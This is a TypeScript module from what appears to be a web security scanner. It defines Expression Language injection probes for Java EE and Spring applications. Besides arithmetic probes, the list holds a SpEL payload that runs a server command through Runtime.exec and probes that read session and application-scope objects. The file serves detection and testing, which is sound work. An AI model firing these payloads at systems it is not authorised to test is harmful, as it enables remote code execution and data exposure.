// Expression Language (EL) injection active check family — Java EE / Spring.
import type { PayloadVariant } from '../types';

export const META = {
  id: 'expression-language-injection',
  family: 'expression-language-injection' as const,
  name: 'Expression Language Injection',
  description: 'Detects EL injection in Java EE/Spring via arithmetic and class-loading probes.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['query', 'body', 'json', 'header'],
};

const EL_PROBES = [
  { value: '${7*7}', intent: 'Spring EL arithmetic — expect 49', signals: ['ssti-math-result'] },
  { value: '#{7*7}', intent: 'JSF/Unified EL arithmetic — expect 49', signals: ['ssti-math-result'] },
  { value: 'T(java.lang.Runtime).getRuntime().exec("id")', intent: 'Spring SpEL RCE via Runtime.exec()', signals: ['command-output'] },
  { value: '${applicationScope}', intent: 'EL scope leak — applicationScope map', signals: ['error-disclosure'] },
  { value: '${pageContext.request.getSession()}', intent: 'EL session object access', signals: ['error-disclosure'] },
  { value: '#{session.getAttribute("user")}', intent: 'JSF EL session attribute read', signals: ['error-disclosure'] },
];

export function variants(): PayloadVariant[] {
  return EL_PROBES.map((p, i) => ({ id: `el-${i+1}`, family: 'expression-language-injection' as const, value: p.value, encoding: 'raw' as const, intent: p.intent, requiresOast: false, requiresBrowser: false, destructiveRisk: 'none' as const, expectedSignals: p.signals }));
}
